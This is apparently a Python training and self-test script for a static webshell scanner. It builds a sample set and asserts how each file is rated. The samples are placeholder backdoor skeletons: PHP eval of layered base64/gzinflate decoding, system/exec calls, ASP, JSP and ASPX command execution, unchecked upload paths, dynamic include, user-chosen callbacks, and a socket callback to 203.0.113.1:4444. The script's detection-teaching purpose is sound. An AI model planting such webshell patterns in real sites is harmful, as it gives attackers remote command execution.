"""实战演练：真实特征样本集的静态扫描与评分定级。

样本集覆盖实战常见的七类形态：正常业务、文档误报、命令执行、多层编码 + 动态求值、
文件上传落盘、外联回连、动态包含/回调，以及 ASP / JSP / ASPX 三种语言的后门骨架。
所有样本的载荷、命令、地址、路径一律是占位符，**不可直接作为后门部署**；
本脚本只做只读扫描（不导入、不解码、不执行任何被扫描内容）。
"""
import argparse
import json
import tempfile
from pathlib import Path
from static_scan import scan_tree, inspect_text, score_findings, classify_score

# 特征样本：文件名为展示名。内容只保留特征骨架，载荷为占位符。
SAMPLES = {
    'clean.php': """<?php
$name = $_GET['name'] ?? 'guest';
echo "<h1>Hello " . htmlspecialchars($name) . "</h1>";
""",
    'docs.txt': """内网文档：运维同学请勿在生产执行 system() / exec()，
使用 base64_decode 前确认来源。参考手册：https://example.local/manual
""",
    'simple-cmd.php': """<?php
// 占位载荷演示：真实场景中此处命令由外部输入拼接
system('whoami');   // 占位命令，仅用于教学特征演示
""",
    'obfuscated.php': """<?php
// 经典一句话后门骨架：多层编码 + 动态求值（载荷为占位符，不可直接执行）
@eval(gzinflate(str_rot13(base64_decode('eJwLSS0uAQAFAAGi'))));
""",
    'asp.asp': """<%
Set sh = CreateObject("WScript.Shell")
sh.Run "cmd /c whoami"   ' 占位命令
%>
""",
    'jsp.jsp': """<%
Runtime.getRuntime().exec(new String[]{"sh", "-c", "id"});  // 占位
%>
""",
    'aspx.aspx.cs': """<%@ Page Language="C#" %>
<script runat="server">
  System.Diagnostics.Process.Start("whoami");  // 占位命令
</script>
""",

    # ── 形态 4：文件上传 / 落盘（上传点是最常见的入口）────────────────
    # 说明：真实后门会把上传文件移动到 Web 可访问目录并改名成 .php；
    # 这里的载荷、目标路径全是占位符，落盘后也无法执行。
    'upload-shell.php': """<?php
// 上传形态骨架：写入路径来自外部输入（占位）
$dst = $_POST['dst'] ?? '/tmp/placeholder-noop';
move_uploaded_file($_FILES['f']['tmp_name'], $dst);
""",

    # ── 形态 5：外联 / 回连（占位地址，不真实发起连接）──────────────
    'network-backdoor.php': """<?php
// 外联形态骨架：回连地址是文档专用网段里的占位值，不会真的连出去
$s = fsockopen('203.0.113.1', 4444);
fwrite($s, 'placeholder');
""",

    # ── 形态 6：动态包含（包含目标来自外部输入）─────────────────────
    'dynamic-include.php': """<?php
// 动态包含骨架：$_GET['page'] 是占位名，未提供任何可包含的恶意文件
include($_GET['page']);
""",

    # ── 形态 7：回调 / 可变函数（函数名来自外部输入）────────────────
    'callback-backdoor.php': """<?php
// 回调形态骨架：函数名来自外部输入，第二个参数为占位串
$fn = $_GET['fn'];
call_user_func($fn, 'placeholder');
""",

    # ── 对照组：**正常业务**的上传处理器 ─────────────────────────────
    # 关键教学点：它做了类型白名单 + 随机改名，逻辑完全正当，
    # 但仍然命中了 file_write / php_superglobal_input 等高权重规则。
    # "命中"与"恶意"之间隔着一整个数据流分析 —— 这正是需要人工复核的原因。
    'benign-upload.php': """<?php
// 正常业务：校验类型 + 随机重命名，没有任何后门行为
$allow = ['image/png', 'image/jpeg'];
if (!in_array($_FILES['avatar']['type'], $allow, true)) {
    http_response_code(400);
    exit;
}
move_uploaded_file($_FILES['avatar']['tmp_name'],
    '/srv/static/avatars/' . bin2hex(random_bytes(8)) . '.bin');
""",
}


def build_lab(root):
    for name, content in SAMPLES.items():
        (root / name).write_text(content, encoding='utf-8')


def self_test():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        build_lab(root)
        report = scan_tree(root)
        rows = {x['file']: x for x in report['files']}

        # 正常代码：可以有输入读取，但不应定级为 high/critical
        clean = rows['clean.php']
        assert clean['severity'] in ('clean', 'low', 'medium'), clean['severity']

        # 文档误报：安全文档列出危险 API 名称 → 会命中且评级虚高（教学点：需要降噪）
        doc = rows['docs.txt']
        assert doc['findings'], '文档必须命中规则以演示误报'
        assert doc['severity'] in ('medium', 'high'), doc['severity']

        # 命令执行样本必须被识别
        simple = rows['simple-cmd.php']
        assert any(f['rule'] == 'php_cmd_exec' for f in simple['findings'])

        # 混淆样本：多层编码 + 动态求值 → 必须 high/critical（这里应为 critical）
        obf = rows['obfuscated.php']
        assert any(f['rule'] == 'encode_decode' for f in obf['findings'])
        assert any(f['rule'] == 'php_dynamic_eval' for f in obf['findings'])
        assert obf['severity'] in ('high', 'critical'), obf['severity']

        # 跨语言：ASP/JSP/ASPX 各自特征
        assert any(f['rule'] == 'asp_wscript_shell' for f in rows['asp.asp']['findings'])
        assert any(f['rule'] == 'jsp_runtime_exec' for f in rows['jsp.jsp']['findings'])
        assert any(f['rule'] == 'aspx_process_start' for f in rows['aspx.aspx.cs']['findings'])

        # 形态 4 文件上传：写盘类 API 必须被识别
        assert any(f['rule'] == 'file_write' for f in rows['upload-shell.php']['findings'])
        # 形态 5 外联：socket 类 API 必须被识别（占位地址，不会真的连出去）
        assert any(f['rule'] == 'network_socket' for f in rows['network-backdoor.php']['findings'])
        # 形态 6 动态包含
        assert any(f['rule'] == 'include_dynamic' for f in rows['dynamic-include.php']['findings'])
        # 形态 7 回调 / 可变函数
        assert any(f['rule'] == 'php_call_user_func' for f in rows['callback-backdoor.php']['findings'])

        # 对照组：**正常业务**的上传处理器同样命中高权重 API → 分级不可能是 clean。
        # 这是本课最重要的一条：静态命中只能作为复核线索，不能作为恶意结论。
        benign = rows['benign-upload.php']
        assert any(f['rule'] == 'file_write' for f in benign['findings'])
        assert benign['severity'] != 'clean', '正常上传处理器也会命中，必须靠人工复核降噪'

        # 评分函数与分级一致性（评分可用独立函数复现，不依赖扫描路径）
        findings = inspect_text(SAMPLES['obfuscated.php'])
        score = score_findings(findings)
        assert classify_score(score) == obf['severity']

        return report


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--self-test', action='store_true')
    parser.add_argument('--lab', action='store_true',
                        help='在临时目录生成特征样本集并扫描（只读）')
    args = parser.parse_args()

    if args.self_test:
        result = self_test()
        print('SELF-TEST OK')
    elif args.lab:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            build_lab(root)
            print(json.dumps(scan_tree(root), ensure_ascii=False, indent=2))
    else:
        parser.print_help()